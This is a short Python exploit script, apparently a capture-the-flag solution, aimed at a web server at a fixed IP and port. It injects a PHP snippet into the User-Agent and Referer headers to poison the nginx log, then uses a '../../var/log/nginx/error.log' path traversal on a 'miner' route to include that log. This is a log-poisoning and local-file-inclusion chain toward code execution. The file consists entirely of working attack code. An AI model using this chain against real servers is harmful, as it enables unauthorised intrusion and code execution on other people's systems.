import requests

url = "http://178.62.54.33:30214/"
# log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
payload = """<?php $minerLog=scandir('/');"""
headers = {"User-Agent": payload,
           "Referer": payload}  # poison nginx
resData = requests.get(url, proxies={"http": "127.0.0.1:8080"}, headers=headers)
print("Poison log response status code: ", resData.status_code)

minerID = r"../../var/log/nginx/error.log"
uri = f"{url}miner/{minerID}"
print(uri)
resData = requests.get(uri, proxies={"http": "127.0.0.1:8080"})
print("LFI on log file poisoned with ", payload, "response status code: ", resData.status_code)

